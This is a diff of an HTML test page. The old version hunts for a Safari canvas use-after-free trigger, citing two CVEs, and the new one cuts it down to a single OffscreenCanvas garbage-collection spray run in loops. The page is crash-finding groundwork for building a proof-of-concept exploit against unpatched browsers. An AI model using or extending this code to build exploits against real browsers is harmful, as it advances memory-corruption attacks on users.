@@ -1,197 +1,34 @@
 <!doctype html><html><head>
-<meta charset=utf8>
-<meta name=viewport content="width=device-width,initial-scale=1">
-<title>Canvas UAF Hunter</title>
-<style>
-body{background:#0a0a0a;color:#e4e4e4;font:13px monospace;padding:16px}
+<meta charset=utf8><meta name=viewport content="width=device-width,initial-scale=1">
+<title>P10 isolated</title>
+<style>body{background:#0a0a0a;color:#e4e4e4;font:13px monospace;padding:16px}
+#o{background:#111;border:1px solid #333;border-radius:8px;padding:14px;height:80vh;overflow-y:auto;white-space:pre-wrap;margin-top:10px}
 button{background:#ff453a;color:#fff;border:none;padding:12px 20px;border-radius:8px;cursor:pointer;margin:4px}
-button.g{background:#32d74b;color:#000}
-#o{background:#111;border:1px solid #2a2a2a;border-radius:8px;padding:14px;height:calc(100vh - 160px);overflow-y:auto;white-space:pre-wrap;margin-top:10px}
-.g{color:#32d74b}.r{color:#ff453a}.a{color:#ff9f0a}.d{color:#666}
+.g{color:#32d74b}.d{color:#666}.r{color:#ff453a}
 </style></head><body>
-<button onclick="run()">▶ Run All Patterns</button>
-<button class=g onclick="copyLog()">Copy</button>
-<button onclick="document.getElementById('o').textContent=''">Clear</button>
+<button onclick="run(10)">▶ 10 iters</button>
+<button onclick="run(50)">▶ 50 iters</button>
+<button onclick="run(200)">▶ 200 iters</button>
 <div id="o"></div>
 <script>
 function log(s,c){const d=document.getElementById('o'),e=document.createElement('span');if(c)e.className=c;e.textContent=s+'\n';d.appendChild(e);d.scrollTop=d.scrollHeight;}
-function ok(s){log('[+] '+s,'g')} function bad(s){log('[!] '+s,'r')}
-function warn(s){log('[~] '+s,'a')} function info(s){log('[*] '+s,'d')}
-function copyLog(){navigator.clipboard.writeText(document.getElementById('o').textContent);}
-function sleep(ms){return new Promise(r=>setTimeout(r,ms));}
-
-// Each pattern: run 1000 iterations and check if it crashes
-// If Safari crashes = we found the UAF trigger
-// If it doesn't crash = move to next pattern
-
-async function pat(name, fn) {
-    info('Testing: '+name);
-    try {
-        for(let i=0;i<1000;i++) { await fn(i); }
-        ok(name+' → survived 1000 iters (no crash)');
-    } catch(e) {
-        warn(name+' → JS exception: '+e.message);
-    }
-    await sleep(20);
-}
-
-async function run(){
+async function run(n){
     document.getElementById('o').textContent='';
-    ok('Canvas UAF Hunter — targeting CVE-2026-64718 & CVE-2026-64783');
-    info('iOS 26.5.2 — bugs unpatched in Safari 26.6 era');
-    info('Each pattern runs 1000x — crash = UAF trigger found');
-    info('');
-
-    // Pattern 1: OffscreenCanvas transfer + GC stress
-    await pat('P1: OffscreenCanvas transfer during GC', async(i)=>{
-        const oc = new OffscreenCanvas(64,64);
-        const ctx = oc.getContext('2d');
-        ctx.fillRect(0,0,64,64);
-        const bm = await oc.transferToImageBitmap();
-        // Force GC pressure
-        if(i%100===0) { const a=[]; for(let k=0;k<1000;k++) a.push(new ArrayBuffer(1024)); }
-        bm.close();
-    });
-
-    // Pattern 2: Canvas element removed from DOM during putImageData
-    await pat('P2: Canvas DOM removal during putImageData', async(i)=>{
-        const c=document.createElement('canvas');
-        c.width=c.height=64;
-        document.body.appendChild(c);
-        const ctx=c.getContext('2d');
-        const id=ctx.createImageData(64,64);
-        document.body.removeChild(c); // Remove while ctx still live
-        ctx.putImageData(id,0,0);
-        c.remove();
-    });
-
-    // Pattern 3: CanvasGradient after canvas context reset
-    await pat('P3: CanvasGradient after context invalidation', async(i)=>{
-        const c=document.createElement('canvas');
-        c.width=c.height=64;
-        const ctx=c.getContext('2d');
-        const g=ctx.createLinearGradient(0,0,64,64);
-        g.addColorStop(0,'red'); g.addColorStop(1,'blue');
-        // Reset context
-        c.width=c.width;
-        // Use gradient after reset
-        const ctx2=c.getContext('2d');
-        ctx2.fillStyle=g;
-        ctx2.fillRect(0,0,64,64);
-    });
-
-    // Pattern 4: ImageBitmap from closed canvas
-    await pat('P4: ImageBitmap from detached OffscreenCanvas', async(i)=>{
-        const oc1=new OffscreenCanvas(64,64);
-        const ctx1=oc1.getContext('2d');
-        ctx1.fillRect(0,0,64,64);
-        const bm=await createImageBitmap(oc1);
-        // Now use bm after oc1 might be GC'd
-        if(i%100===0){const a=[];for(let k=0;k<5000;k++)a.push({});}
-        const oc2=new OffscreenCanvas(64,64);
-        const ctx2=oc2.getContext('2d');
-        ctx2.drawImage(bm,0,0);
-        bm.close();
-    });
-
-    // Pattern 5: WebGL context loss + drawArrays during loss
-    await pat('P5: WebGL context loss + draw', async(i)=>{
-        const c=document.createElement('canvas');
-        c.width=c.height=64;
-        const gl=c.getContext('webgl',{preserveDrawingBuffer:false});
-        if(!gl) return;
-        const ext=gl.getExtension('WEBGL_lose_context');
-        if(!ext) return;
-        // Draw then lose context
-        gl.clearColor(0,0,0,1); gl.clear(gl.COLOR_BUFFER_BIT);
-        ext.loseContext();
-        // Try to draw after loss
-        gl.clearColor(1,0,0,1);
-        gl.clear(gl.COLOR_BUFFER_BIT);
-        ext.restoreContext();
-    });
-
-    // Pattern 6: Pattern that matches typical fuzzer finds
-    // Canvas save/restore with layer manipulation
-    await pat('P6: Canvas beginLayer after max saves', async(i)=>{
-        const c=document.createElement('canvas');
-        c.width=c.height=64;
-        const ctx=c.getContext('2d');
-        // Hit save limit then call beginLayer
-        for(let k=0;k<1024;k++) ctx.save();
-        if(typeof ctx.beginLayer==='function'){
-            ctx.beginLayer();
-            ctx.fillRect(0,0,64,64);
-            ctx.endLayer();
-        }
-        for(let k=0;k<1024;k++) ctx.restore();
-    });
-
-    // Pattern 7: Rapid canvas width reassignment during draw ops
-    await pat('P7: Canvas resize during active draw', async(i)=>{
-        const c=document.createElement('canvas');
-        c.width=c.height=256;
-        const ctx=c.getContext('2d');
-        // Start a draw op
-        const img=ctx.createImageData(256,256);
-        // Resize canvas (flushes context)
-        c.width=128;
-        // Try to put old image data
-        try { ctx.putImageData(img,0,0); } catch(e){}
-    });
-
-    // Pattern 8: Worker OffscreenCanvas transfer race
-    await pat('P8: OffscreenCanvas transferControlToOffscreen', async(i)=>{
-        const c=document.createElement('canvas');
-        c.width=c.height=64;
-        document.body.appendChild(c);
-        try {
-            const oc=c.transferControlToOffscreen();
-            // Parent context should now be invalid
-            const ctx=c.getContext('2d'); // should return null
-            if(ctx) ctx.fillRect(0,0,64,64); // UAF if returned non-null
-        } catch(e){}
-        document.body.removeChild(c);
-    });
-
-    // Pattern 9: createPattern from OffscreenCanvas that gets transferred
-    await pat('P9: CanvasPattern from transferred canvas', async(i)=>{
-        const src=document.createElement('canvas');
-        src.width=src.height=32;
-        const sctx=src.getContext('2d');
-        sctx.fillStyle='red'; sctx.fillRect(0,0,32,32);
-        const dst=document.createElement('canvas');
-        dst.width=dst.height=64;
-        const dctx=dst.getContext('2d');
-        const pattern=dctx.createPattern(src,'repeat');
-        // Now transfer src to offscreen (detaches it)
-        try { src.transferControlToOffscreen(); } catch(e){}
-        // Use pattern after src is detached
-        dctx.fillStyle=pattern;
-        dctx.fillRect(0,0,64,64);
-    });
-
-    // Pattern 10: Mass OffscreenCanvas GC pressure
-    await pat('P10: Mass OffscreenCanvas GC spray', async(i)=>{
+    log('[*] P10 × '+n+' iters starting...','d');
+    for(let i=0;i<n;i++){
         const canvases=[];
         for(let k=0;k<100;k++){
             const oc=new OffscreenCanvas(64,64);
             oc.getContext('2d').fillRect(0,0,64,64);
             canvases.push(oc);
         }
-        // Drop half
         canvases.splice(0,50);
-        // Create ImageBitmaps from remaining
         for(const oc of canvases){
             const bm=await oc.transferToImageBitmap();
             bm.close();
         }
-    });
-
-    info('');
-    ok('All patterns survived — no crash (or crash before log)');
-    info('If Safari crashed during testing: that pattern IS the UAF trigger');
-    info('Check which pattern was running when Safari crashed');
-    info('Rerun with just that pattern to confirm, then build PoC');
+        log('[*] iter '+i+' done','d');
+    }
+    log('[+] Completed '+n+' iters — no crash','g');
 }
 </script></body></html>
